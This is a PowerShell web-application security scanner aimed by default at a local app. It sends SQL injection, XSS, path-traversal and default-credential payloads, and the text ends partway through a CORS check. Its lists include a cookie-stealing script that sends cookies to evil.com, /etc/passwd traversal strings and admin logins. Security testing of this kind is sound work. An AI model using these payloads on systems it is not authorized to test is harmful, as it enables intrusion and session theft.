# =========================================
# ADVANCED SECURITY TESTING FRAMEWORK
# =========================================

#region Parameters
param(
    [Parameter(Mandatory = $false)]
    # CORREÇÃO: Usando 127.0.0.1 (IPv4 loopback) em vez de localhost para evitar problemas de resolução IPv6 (::1).
    [string]$TargetURL = "http://127.0.0.1:3000", 
    
    [Parameter(Mandatory = $false)]
    [string]$SupabaseURL = "http://localhost:54321",
    
    [Parameter(Mandatory = $false)]
    [string]$SupabaseKey,
    
    [Parameter(Mandatory = $false)]
    [string]$WordlistPath,
    
    [Parameter(Mandatory = $false)]
    [int]$MaxConcurrentRequests = 1,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipBruteForce,
    
    [Parameter(Mandatory = $false)]
    [switch]$SkipDOSCheck,
    
    [Parameter(Mandatory = $false)]
    [switch]$SaveResponses,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("Quick", "Standard", "Comprehensive")]
    [string]$ScanMode = "Standard",
    
    [Parameter(Mandatory = $false)]
    [string]$Proxy,
    
    [Parameter(Mandatory = $false)]
    [string]$CustomHeaders,
    
    [Parameter(Mandatory = $false)]
    [switch]$VerboseOutput
)

# Add required assemblies
Add-Type -AssemblyName System.Web
#endregion

#region Configuration
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Create session for connection reuse
$session = $null
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Security-Scanner/1.0"
}

if ($CustomHeaders) {
    $CustomHeaders.Split(";") | ForEach-Object {
        $keyValue = $_.Split("=")
        if ($keyValue.Count -eq 2) {
            $headers[$keyValue[0].Trim()] = $keyValue[1].Trim()
        }
    }
}

# Define scan intensity based on mode
$scanConfig = @{
    "Quick" = @{
        SQLiPayloads = 3
        XSSPayloads = 2
        DirectoryTests = 5
        PortChecks = 0
    }
    "Standard" = @{
        SQLiPayloads = 10
        XSSPayloads = 5
        DirectoryTests = 15
        PortChecks = 10
    }
    "Comprehensive" = @{
        SQLiPayloads = 25
        XSSPayloads = 15
        DirectoryTests = 50
        PortChecks = 20
    }
}

$config = $scanConfig[$ScanMode]

# Create output directory structure
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$hostname = ([System.Uri]$TargetURL).Host
$baseDir = Join-Path $PSScriptRoot "SecurityAudit_${hostname}_$timestamp"

$directories = @{
    Base = $baseDir
    Reports = Join-Path $baseDir "reports"
    Evidence = Join-Path $baseDir "evidence"
    Logs = Join-Path $baseDir "logs"
    Responses = Join-Path $baseDir "responses"
    Screenshots = Join-Path $baseDir "screenshots"
    Data = Join-Path $baseDir "data"
}

$directories.Values | ForEach-Object { 
    New-Item -ItemType Directory -Force -Path $_ | Out-Null 
}

# Log file
$logFile = Join-Path $directories.Logs "audit_$timestamp.log"
#endregion

#region Global Variables
$global:results = [System.Collections.ArrayList]@()
$global:vulnerabilities = [System.Collections.ArrayList]@()
$global:warnings = [System.Collections.ArrayList]@()
$global:informational = [System.Collections.ArrayList]@()
$global:evidence = [System.Collections.ArrayList]@()

$global:stats = @{
    TotalRequests = 0
    TotalTests = 0
    SuccessfulRequests = 0
    FailedRequests = 0
    StartTime = Get-Date
    ExecutionTime = [System.Diagnostics.Stopwatch]::StartNew()
}

$global:targetInfo = @{
    URL = $TargetURL
    Hostname = $hostname
    IPAddress = $null
    ServerHeaders = @()
    Technologies = @()
    OpenPorts = @()
}
#endregion

#region Logging Functions
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [switch]$Console
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    Add-Content -Path $logFile -Value $logMessage
    
    if ($Console -or $VerboseOutput) {
        $color = switch($Level) {
            "ERROR" { "Red" }
            "WARN" { "Yellow" }
            "INFO" { "Cyan" }
            "SUCCESS" { "Green" }
            "DEBUG" { "Gray" }
            default { "White" }
        }
        Write-Host $logMessage -ForegroundColor $color
    }
}

function Save-Evidence {
    param(
        [string]$Category,
        [string]$TestName,
        [string]$Description,
        [string]$Content,
        [string]$FileName
    )
    
    if ($SaveResponses -and $Content) {
        $evidenceFile = Join-Path $directories.Evidence $FileName
        $Content | Out-File -FilePath $evidenceFile -Encoding UTF8
        
        $evidenceItem = @{
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Category = $Category
            TestName = $TestName
            Description = $Description
            FilePath = $evidenceFile
        }
        $global:evidence.Add($evidenceItem) | Out-Null
        
        Write-Log "Evidence saved: $evidenceFile" -Level DEBUG
    }
}
#endregion

#region Core Functions
function Invoke-SafeRequest {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [hashtable]$Headers = @{},
        [string]$Body,
        [int]$TimeoutSec = 10,
        [switch]$ReturnResponse
    )
    
    $requestId = [Guid]::NewGuid().ToString("N").Substring(0,8)
    Write-Log "[REQ-$requestId] $Method $Uri" -Level DEBUG
    
    try {
        $params = @{
            Uri = $Uri
            Method = $Method
            TimeoutSec = $TimeoutSec
            UserAgent = $headers["User-Agent"]
            Headers = $Headers
            UseBasicParsing = $true
            SessionVariable = 'session'
        }
        
        if ($Body) {
            $params.Body = $Body
            $params.ContentType = 'application/x-www-form-urlencoded'
        }
        
        if ($Proxy) {
            $params.Proxy = $Proxy
        }
        
        $response = Invoke-WebRequest @params -ErrorAction Stop
        $global:stats.TotalRequests++
        $global:stats.SuccessfulRequests++
        
        Write-Log "[REQ-$requestId] Status: $($response.StatusCode)" -Level DEBUG
        
        if ($ReturnResponse) {
            return @{
                Success = $true
                Response = $response
                StatusCode = $response.StatusCode
                Headers = $response.Headers
                Content = $response.Content
                RawContent = $response.RawContent
            }
        }
        
        return @{ Success = $true; StatusCode = $response.StatusCode }
        
    } catch {
        $global:stats.TotalRequests++
        $global:stats.FailedRequests++
        
        $errorDetails = $_.Exception.Message
        Write-Log "[REQ-$requestId] Failed: $errorDetails" -Level DEBUG
        
        if ($ReturnResponse) {
            return @{
                Success = $false
                Error = $errorDetails
                StatusCode = $null
            }
        }
        
        return @{ Success = $false; Error = $errorDetails }
    }
}

function Add-TestResult {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Category,
        
        [Parameter(Mandatory=$true)]
        [string]$TestName,
        
        [Parameter(Mandatory=$true)]
        [string]$Details,
        
        [Parameter(Mandatory=$true)]
        [ValidateSet("VULNERABLE", "WARNING", "SECURE", "INFO", "ERROR")]
        [string]$Status,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")]
        [string]$Severity = "INFO",
        
        [string]$Recommendation,
        [string]$CWE,
        [string]$Remediation,
        [object]$Evidence
    )
    
    $result = [PSCustomObject]@{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Category = $Category
        TestName = $TestName
        Details = $Details
        Status = $Status
        Severity = $Severity
        Recommendation = $Recommendation
        CWE = $CWE
        Remediation = $Remediation
        Evidence = $Evidence
    }
    
    $global:results.Add($result) | Out-Null
    $global:stats.TotalTests++
    
    switch ($Status) {
        "VULNERABLE" { $global:vulnerabilities.Add($result) | Out-Null }
        "WARNING" { $global:warnings.Add($result) | Out-Null }
        "INFO" { $global:informational.Add($result) | Out-Null }
    }
    
    # Console output
    $color = switch($Status) {
        "VULNERABLE" { 
            switch($Severity) {
                "CRITICAL" { "Red" }
                "HIGH" { "DarkRed" }
                "MEDIUM" { "Yellow" }
                "LOW" { "DarkYellow" }
                default { "Red" }
            }
        }
        "WARNING" { "Yellow" }
        "SECURE" { "Green" }
        "INFO" { "Cyan" }
        "ERROR" { "Magenta" }
        default { "White" }
    }
    
    # Usa caracteres ASCII simples para evitar erro de encoding.
    $statusSymbol = switch($Status) {
        "VULNERABLE" { "x" } 
        "WARNING" { "!" }
        "SECURE" { "v" } 
        "INFO" { "i" }
        "ERROR" { "e" } 
        default { " " }
    }
    
    Write-Host "[$statusSymbol] " -NoNewline -ForegroundColor $color
    # Usa ${TestName}: para resolver o erro de interpolação de variáveis.
    Write-Host "$Category - ${TestName}: $Details" -ForegroundColor $color
    
    # Log to file
    # Usa ${TestName}: para resolver o erro de interpolação de variáveis.
    Write-Log "[$Status] $Category - ${TestName}: $Details" -Level $Status
}

function Test-Endpoint {
    param(
        [string]$Url,
        [string]$ExpectedStatus = "200",
        [string]$TestName = "Endpoint Check"
    )
    
    $result = Invoke-SafeRequest -Uri $Url -ReturnResponse
    if ($result.Success -and $result.StatusCode -eq $ExpectedStatus) {
        return $true, $result
    }
    return $false, $result
}
#endregion

#region Banner
Write-Host "`n" -NoNewline
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "#             SECURITY TESTING FRAMEWORK                   #" -ForegroundColor Cyan
Write-Host "#                   Advanced Edition                       #" -ForegroundColor Cyan
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "`n"

Write-Host "------------------------------------------------------------" -ForegroundColor Yellow
Write-Host "| Target:          $($TargetURL.PadRight(40)) |" -ForegroundColor Yellow
Write-Host "| Scan Mode:       $($ScanMode.PadRight(40)) |" -ForegroundColor Yellow
Write-Host "| Timestamp:       $((Get-Date -Format 'yyyy-MM-dd HH:mm:ss').PadRight(40)) |" -ForegroundColor Yellow
Write-Host "------------------------------------------------------------" -ForegroundColor Yellow
Write-Host "`n"
#endregion

#region Phase 1: Reconnaissance
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 1: RECONNAISSANCE" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 1: Reconnaissance" -Console

# Get target IP
try {
    # Usando a URL para garantir que o hostname seja o correto (127.0.0.1 ou o que for passado)
    $ipAddress = [System.Net.Dns]::GetHostAddresses($hostname) | Select-Object -First 1
    $global:targetInfo.IPAddress = $ipAddress.IPAddressToString
    Write-Log "Resolved $hostname to $($global:targetInfo.IPAddress)" -Console
} catch {
    Write-Log "Could not resolve hostname: $hostname" -Level WARN -Console
}

# Test basic connectivity
Write-Host "`n[1.1] Testing connectivity..." -ForegroundColor Gray
$connectivity = Test-Endpoint -Url $TargetURL -TestName "Initial Connectivity"
if ($connectivity[0]) {
    Add-TestResult -Category "Connectivity" -TestName "Target Reachable" `
        -Details "Target is responding to requests" -Status "SECURE" -Severity "INFO"
} else {
    Add-TestResult -Category "Connectivity" -TestName "Target Reachable" `
        -Details "Target is not reachable. Check if the server at $TargetURL is running." -Status "ERROR" -Severity "INFO"
    Write-Host "ERROR: Target is not reachable. Check if the server at $TargetURL is running. Exiting..." -ForegroundColor Red
    exit 1
}

# Get server headers and technology info
Write-Host "`n[1.2] Gathering server information..." -ForegroundColor Gray
$response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
if ($response.Success) {
    $serverHeaders = $response.Response.Headers
    
    # Check for server headers
    $serverHeader = $serverHeaders["Server"]
    if ($serverHeader) {
        $global:targetInfo.ServerHeaders += $serverHeader
        Write-Log "Server header detected: $serverHeader" -Console
    }
    
    # Check common technology indicators
    $techIndicators = @{
        "X-Powered-By" = "Server Technology"
        "X-AspNet-Version" = "ASP.NET"
        "X-AspNetMvc-Version" = "ASP.NET MVC"
        "X-Generator" = "CMS/Framework"
        "X-Drupal-Cache" = "Drupal"
        "X-WP-Total" = "WordPress"
    }
    
    foreach ($indicator in $techIndicators.Keys) {
        if ($serverHeaders[$indicator]) {
            $tech = "$($techIndicators[$indicator]): $($serverHeaders[$indicator])"
            $global:targetInfo.Technologies += $tech
            Write-Log "Technology detected: $tech" -Console
        }
    }
    
    # Check response body for technology signatures
    $body = $response.Response.Content
    $techPatterns = @{
        "jquery" = "jQuery"
        "react" = "React"
        "vue" = "Vue.js"
        "angular" = "Angular"
        "wordpress" = "WordPress"
        "drupal" = "Drupal"
        "joomla" = "Joomla"
    }
    
    foreach ($pattern in $techPatterns.Keys) {
        if ($body -match $pattern) {
            $global:targetInfo.Technologies += $techPatterns[$pattern]
        }
    }
}
#endregion

#region Phase 2: Vulnerability Scanning
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 2: VULNERABILITY SCANNING" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 2: Vulnerability Scanning" -Console

# Test 1: Advanced SQL Injection
Write-Host "`n[2.1] Testing SQL Injection (Advanced)..." -ForegroundColor Gray
$sqliPayloads = @(
    # Basic injections
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    
    # Union based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    
    # Error based
    "' AND 1=CAST((SELECT @@version) AS INT)--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Blind boolean
    "' AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--"
)
# Resto do código de teste SQLi
$sqliDetected = 0
$sqliEvidence = @()

foreach($payload in $sqliPayloads[0..($config.SQLiPayloads-1)]) {
    try {
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        
        # Test in URL parameters
        $url = "$TargetURL/login?email=$encoded&password=test"
        $result = Invoke-SafeRequest -Uri $url -ReturnResponse
        
        if ($result.Success) {
            $content = $result.Content
            $evidenceId = "sqli_" + (Get-Random -Minimum 1000 -Maximum 9999)
            
            # Check for SQL error patterns
            $sqlErrors = @(
                "SQL", "mysql", "syntax", "ORA-", "PostgreSQL", "SQLite",
                "Microsoft.*ODBC", "Driver.*SQL", "Unclosed quotation mark",
                "Incorrect syntax", "divide by zero"
            )
            
            foreach ($error in $sqlErrors) {
                if ($content -match $error) {
                    $sqliDetected++
                    $sqliEvidence += @{
                        Payload = $payload
                        Type = "SQL Error Detected"
                        Error = $error
                        EvidenceId = $evidenceId
                    }
                    
                    Save-Evidence -Category "SQLi" -TestName "Error Based" `
                        -Description "SQL error response" -Content $content `
                        -FileName "${evidenceId}.txt"
                    break
                }
            }
            
            # Check for time delays (blind SQLi)
            if ($payload -match "SLEEP|WAITFOR") {
                if ($result.Response.TimeToFirstByte -gt 4000) {
                    $sqliDetected++
                    $sqliEvidence += @{
                        Payload = $payload
                        Type = "Time Based"
                        Delay = $result.Response.TimeToFirstByte
                        EvidenceId = $evidenceId
                    }
                }
            }
        }
    } catch {
        Write-Log "SQLi test failed: $($_.Exception.Message)" -Level DEBUG
    }
}

if($sqliDetected -gt 0) {
    Add-TestResult -Category "Injection" -TestName "SQL Injection" `
        -Details "$sqliDetected SQL injection patterns detected" `
        -Status "VULNERABLE" -Severity "CRITICAL" `
        -Recommendation "Use parameterized queries or prepared statements" `
        -CWE "CWE-89" `
        -Remediation "Implement input validation and use ORM frameworks with parameterized queries" `
        -Evidence $sqliEvidence
} else {
    Add-TestResult -Category "Injection" -TestName "SQL Injection" `
        -Details "No SQL injection vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO" `
        -Recommendation "Continue using parameterized queries"
}

# Test 2: Advanced XSS Testing
Write-Host "`n[2.2] Testing Cross-Site Scripting (Advanced)..." -ForegroundColor Gray
$xssPayloads = @(
    # Basic scripts
    "<script>alert('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    
    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    # JavaScript URIs
    "javascript:alert('XSS')",
    "JaVaScRipT:alert('XSS')",
    
    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    
    # DOM based
    "<script>document.location='http://evil.com/?c='+document.cookie</script>"
)

$xssDetected = 0
$xssEvidence = @()

foreach($payload in $xssPayloads[0..($config.XSSPayloads-1)]) {
    try {
        $testUrl = "$TargetURL/search?q=$payload"
        $result = Invoke-SafeRequest -Uri $testUrl -ReturnResponse
        
        if ($result.Success) {
            $content = $result.Content
            $evidenceId = "xss_" + (Get-Random -Minimum 1000 -Maximum 9999)
            
            # Check if payload is reflected without encoding
            $decodedPayload = [System.Web.HttpUtility]::HtmlDecode($payload)
            if ($content -match [regex]::Escape($decodedPayload)) {
                $xssDetected++
                $xssEvidence += @{
                    Payload = $payload
                    Type = "Reflected XSS"
                    Location = "URL Parameter"
                    EvidenceId = $evidenceId
                }
                
                Save-Evidence -Category "XSS" -TestName "Reflected" `
                    -Description "XSS payload reflection" -Content $content `
                    -FileName "${evidenceId}.txt"
            }
        }
    } catch {
        Write-Log "XSS test failed: $($_.Exception.Message)" -Level DEBUG
    }
}

if($xssDetected -gt 0) {
    Add-TestResult -Category "XSS" -TestName "Cross-Site Scripting" `
        -Details "$xssDetected XSS vulnerabilities detected" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -Recommendation "Implement proper output encoding and Content Security Policy" `
        -CWE "CWE-79" `
        -Remediation "Use frameworks that auto-escape content and implement CSP headers" `
        -Evidence $xssEvidence
} else {
    Add-TestResult -Category "XSS" -TestName "Cross-Site Scripting" `
        -Details "No XSS vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO" `
        -Recommendation "Continue input validation and output encoding practices"
}

# Test 3: Directory Traversal
Write-Host "`n[2.3] Testing Directory Traversal..." -ForegroundColor Gray
$traversalPayloads = @(
    "../../../../etc/passwd",
    "..\..\..\..\windows\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

$traversalDetected = 0
foreach($payload in $traversalPayloads) {
    try {
        $testUrl = "$TargetURL/download?file=$payload"
        $result = Invoke-SafeRequest -Uri $testUrl -ReturnResponse
        
        if ($result.Success -and $result.Content -match "root:|\[fonts\]") {
            $traversalDetected++
        }
    } catch {
        Write-Log "Traversal test failed: $($_.Exception.Message)" -Level DEBUG
    }
}

if($traversalDetected -gt 0) {
    Add-TestResult -Category "Path Traversal" -TestName "Directory Traversal" `
        -Details "Directory traversal vulnerability detected" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -CWE "CWE-22" `
        -Recommendation "Validate file paths and use allow lists"
} else {
    Add-TestResult -Category "Path Traversal" -TestName "Directory Traversal" `
        -Details "No directory traversal vulnerabilities detected" `
        -Status "SECURE" -Severity "INFO"
}

# Test 4: Security Headers Check
Write-Host "`n[2.4] Testing Security Headers..." -ForegroundColor Gray
$response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
if ($response.Success) {
    $headers = $response.Response.Headers
    
    $securityHeaders = @{
        "X-Content-Type-Options" = @{
            Expected = "nosniff"
            Description = "Prevents MIME type sniffing"
            Severity = "MEDIUM"
        }
        "X-Frame-Options" = @{
            Expected = "DENY"
            Description = "Prevents clickjacking"
            Severity = "MEDIUM"
        }
        "X-XSS-Protection" = @{
            Expected = "1; mode=block"
            Description = "Enables XSS filter"
            Severity = "LOW"
        }
        "Content-Security-Policy" = @{
            Expected = "*"
            Description = "Defines content sources"
            Severity = "HIGH"
        }
        "Strict-Transport-Security" = @{
            Expected = "max-age=31536000; includeSubDomains"
            Description = "Enforces HTTPS"
            Severity = "HIGH"
        }
        "Referrer-Policy" = @{
            Expected = "strict-origin-when-cross-origin"
            Description = "Controls referrer information"
            Severity = "LOW"
        }
    }
    
    $missingHeaders = @()
    foreach ($header in $securityHeaders.Keys) {
        if (-not $headers[$header]) {
            $missingHeaders += @{
                Header = $header
                Description = $securityHeaders[$header].Description
                Severity = $securityHeaders[$header].Severity
            }
        }
    }
    
    if ($missingHeaders.Count -gt 0) {
        Add-TestResult -Category "Headers" -TestName "Security Headers" `
            -Details "$($missingHeaders.Count) security headers missing" `
            -Status "WARNING" -Severity "MEDIUM" `
            -Recommendation "Implement missing security headers" `
            -Remediation "Add security headers to web server configuration" `
            -Evidence $missingHeaders
    } else {
        Add-TestResult -Category "Headers" -TestName "Security Headers" `
            -Details "All recommended security headers present" `
            -Status "SECURE" -Severity "INFO"
    }
}

# Test 5: Sensitive File Exposure
Write-Host "`n[2.5] Testing Sensitive File Exposure..." -ForegroundColor Gray
$sensitiveFiles = @(
    "/.env",
    "/.git/config",
    "/.htaccess",
    "/web.config",
    "/package.json",
    "/composer.json",
    "/yarn.lock",
    "/package-lock.json",
    "/README.md",
    "/CHANGELOG.md",
    "/LICENSE",
    "/robots.txt",
    "/sitemap.xml",
    "/admin",
    "/wp-admin",
    "/phpinfo.php",
    "/test.php",
    "/debug.php"
)

$exposedFiles = @()
foreach ($file in $sensitiveFiles[0..($config.DirectoryTests-1)]) {
    try {
        $result = Test-Endpoint -Url "$TargetURL$file"
        if ($result[0]) {
            $exposedFiles += $file
            Write-Log "Sensitive file exposed: $file" -Level WARN
        }
    } catch {
        Write-Log "File check failed: $file" -Level DEBUG
    }
}

if ($exposedFiles.Count -gt 0) {
    Add-TestResult -Category "Information Disclosure" -TestName "Sensitive Files" `
        -Details "$($exposedFiles.Count) sensitive files exposed" `
        -Status "VULNERABLE" -Severity "MEDIUM" `
        -Recommendation "Restrict access to sensitive files" `
        -CWE "CWE-200" `
        -Remediation "Implement proper file permissions and web server restrictions" `
        -Evidence $exposedFiles
} else {
    Add-TestResult -Category "Information Disclosure" -TestName "Sensitive Files" `
        -Details "No sensitive files exposed" `
        -Status "SECURE" -Severity "INFO"
}
#endregion

#region Phase 3: Authentication & Authorization
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 3: AUTHENTICATION & AUTHORIZATION" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 3: Authentication & Authorization" -Console

# Test 6: Default Credentials
if (-not $SkipBruteForce) {
    Write-Host "`n[3.1] Testing Default Credentials..." -ForegroundColor Gray
    
    $defaultCreds = @(
        @{email="admin@admin.com"; password="admin"},
        @{email="administrator@localhost"; password="administrator"},
        @{email="root@localhost"; password="root"},
        @{email="test@test.com"; password="test"},
        @{email="user@user.com"; password="user"}
    )
    
    if ($WordlistPath -and (Test-Path $WordlistPath)) {
        Write-Log "Loading custom wordlist from: $WordlistPath" -Console
        $customCreds = Get-Content $WordlistPath | ForEach-Object {
            $parts = $_ -split ":"
            if ($parts.Count -eq 2) {
                @{email=$parts[0]; password=$parts[1]}
            }
        }
        $defaultCreds += $customCreds
    }
    
    $credSuccess = 0
    $successfulCreds = @()
    
    foreach($cred in $defaultCreds) {
        try {
            if ($SupabaseKey) {
                $body = @{
                    email = $cred.email
                    password = $cred.password
                } | ConvertTo-Json
                
                $result = Invoke-SafeRequest -Uri "$SupabaseURL/auth/v1/token" -Method POST `
                    -Headers @{"apikey"=$SupabaseKey; "Content-Type"="application/json"} `
                    -Body $body -ReturnResponse
                
                if ($result.Success -and $result.StatusCode -eq 200) {
                    $credSuccess++
                    $successfulCreds += "$($cred.email):$($cred.password)"
                    Write-Log "Successful login with: $($cred.email)" -Level WARN
                }
            }
        } catch {
            Write-Log "Auth test failed: $($_.Exception.Message)" -Level DEBUG
        }
    }
    
    if($credSuccess -gt 0) {
        Add-TestResult -Category "Authentication" -TestName "Default Credentials" `
            -Details "$credSuccess successful logins with default credentials" `
            -Status "VULNERABLE" -Severity "CRITICAL" `
            -Recommendation "Change all default credentials immediately" `
            -CWE "CWE-1392" `
            -Remediation "Implement strong password policies and remove default accounts" `
            -Evidence $successfulCreds
    } else {
        Add-TestResult -Category "Authentication" -TestName "Default Credentials" `
            -Details "No default credentials found" `
            -Status "SECURE" -Severity "INFO"
    }
}

# Test 7: Session Management
Write-Host "`n[3.2] Testing Session Management..." -ForegroundColor Gray
try {
    # Check for session cookies without secure flag
    $response = Invoke-SafeRequest -Uri $TargetURL -ReturnResponse
    if ($response.Success) {
        $cookies = $response.Response.Headers["Set-Cookie"]
        $sessionIssues = @()
        
        if ($cookies) {
            if ($cookies -notmatch "Secure") {
                $sessionIssues += "Missing Secure flag"
            }
            if ($cookies -notmatch "HttpOnly") {
                $sessionIssues += "Missing HttpOnly flag"
            }
            if ($cookies -match "SameSite=None" -and $cookies -notmatch "Secure") {
                $sessionIssues += "SameSite=None without Secure flag"
            }
        }
        
        if ($sessionIssues.Count -gt 0) {
            Add-TestResult -Category "Session" -TestName "Cookie Security" `
                -Details "Session cookie security issues: $($sessionIssues -join ', ')" `
                -Status "WARNING" -Severity "MEDIUM" `
                -Recommendation "Implement secure cookie flags" `
                -CWE "CWE-614" `
                -Remediation "Set Secure, HttpOnly, and appropriate SameSite flags on cookies"
        } else {
            Add-TestResult -Category "Session" -TestName "Cookie Security" `
                -Details "Session cookies properly configured" `
                -Status "SECURE" -Severity "INFO"
        }
    }
} catch {
    Write-Log "Session test failed: $($_.Exception.Message)" -Level DEBUG
}
#endregion

#region Phase 4: API Security
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 4: API SECURITY" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 4: API Security" -Console

# Test 8: API Endpoint Discovery
Write-Host "`n[4.1] Discovering API Endpoints..." -ForegroundColor Gray
$apiEndpoints = @(
    "/api",
    "/api/v1",
    "/api/v2",
    "/api/users",
    "/api/admin",
    "/api/config",
    "/api/auth",
    "/api/token",
    "/api/data",
    "/api/database",
    "/graphql",
    "/graphiql",
    "/rest",
    "/v1",
    "/v2"
)

$accessibleEndpoints = @()
foreach($endpoint in $apiEndpoints) {
    try {
        $result = Test-Endpoint -Url "$TargetURL$endpoint"
        if ($result[0]) {
            $accessibleEndpoints += $endpoint
            Write-Log "API endpoint accessible: $endpoint" -Level INFO
        }
    } catch {
        Write-Log "API endpoint check failed: $endpoint" -Level DEBUG
    }
}

if($accessibleEndpoints.Count -gt 0) {
    Add-TestResult -Category "API" -TestName "Endpoint Exposure" `
        -Details "$($accessibleEndpoints.Count) API endpoints accessible without auth" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -Recommendation "Implement authentication for all API endpoints" `
        -CWE "CWE-306" `
        -Remediation "Require authentication tokens for all API endpoints" `
        -Evidence $accessibleEndpoints
} else {
    Add-TestResult -Category "API" -TestName "Endpoint Exposure" `
        -Details "No unprotected API endpoints found" `
        -Status "SECURE" -Severity "INFO"
}

# Test 9: Rate Limiting Test
if (-not $SkipDOSCheck) {
    Write-Host "`n[4.2] Testing Rate Limiting..." -ForegroundColor Gray
    $requests = 50
    $successCount = 0
    
    for ($i = 1; $i -le $requests; $i++) {
        try {
            $result = Invoke-SafeRequest -Uri "$TargetURL/"
            if ($result.Success) {
                $successCount++
            }
            Start-Sleep -Milliseconds 100
        } catch {
            # Rate limiting might cause errors
        }
    }
    
    if ($successCount -eq $requests) {
        Add-TestResult -Category "Availability" -TestName "Rate Limiting" `
            -Details "No rate limiting detected on $requests rapid requests" `
            -Status "WARNING" -Severity "MEDIUM" `
            -Recommendation "Implement rate limiting to prevent DoS attacks" `
            -CWE "CWE-770"
    } else {
        Add-TestResult -Category "Availability" -TestName "Rate Limiting" `
            -Details "Rate limiting appears to be in place" `
            -Status "SECURE" -Severity "INFO"
    }
}
#endregion

#region Phase 5: Advanced Tests
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 5: ADVANCED TESTS" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 5: Advanced Tests" -Console

# Test 10: SSL/TLS Configuration (if HTTPS)
if ($TargetURL.StartsWith("https://")) {
    Write-Host "`n[5.1] Testing SSL/TLS Configuration..." -ForegroundColor Gray
    try {
        # Simple SSL check - in production, use proper SSL testing tools
        $uri = [System.Uri]$TargetURL
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($uri.Host, 443)
        
        $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream())
        $sslStream.AuthenticateAsClient($uri.Host)
        
        $certificate = $sslStream.RemoteCertificate
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificate)
        
        $sslInfo = @{
            Issuer = $cert.Issuer
            Subject = $cert.Subject
            Expiration = $cert.NotAfter
            DaysUntilExpiry = ($cert.NotAfter - (Get-Date)).Days
            Algorithm = $cert.SignatureAlgorithm.FriendlyName
        }
        
        if ($sslInfo.DaysUntilExpiry -lt 30) {
            Add-TestResult -Category "Cryptography" -TestName "SSL Certificate" `
                -Details "Certificate expires in $($sslInfo.DaysUntilExpiry) days" `
                -Status "WARNING" -Severity "MEDIUM" `
                -Recommendation "Renew SSL certificate" `
                -Evidence $sslInfo
        } else {
            Add-TestResult -Category "Cryptography" -TestName "SSL Certificate" `
                -Details "Certificate valid for $($sslInfo.DaysUntilExpiry) days" `
                -Status "SECURE" -Severity "INFO"
        }
        
        $sslStream.Close()
        $tcpClient.Close()
    } catch {
        Add-TestResult -Category "Cryptography" -TestName "SSL Certificate" `
            -Details "SSL test failed: $($_.Exception.Message)" `
            -Status "ERROR" -Severity "INFO"
    }
}

# Test 11: CORS Misconfiguration
Write-Host "`n[5.2] Testing CORS Configuration..." -ForegroundColor Gray
try {
    $corsHeaders = @{
        "Origin" = "https://evil.com"
        "Access-Control-Request-Method" = "POST"
    }
    
    $result = Invoke-SafeRequest -Uri $TargetURL -Method "OPTIONS" -Headers $corsHeaders -ReturnResponse
    
    if ($result.Success) {
        $responseHeaders = $result.Response.Headers
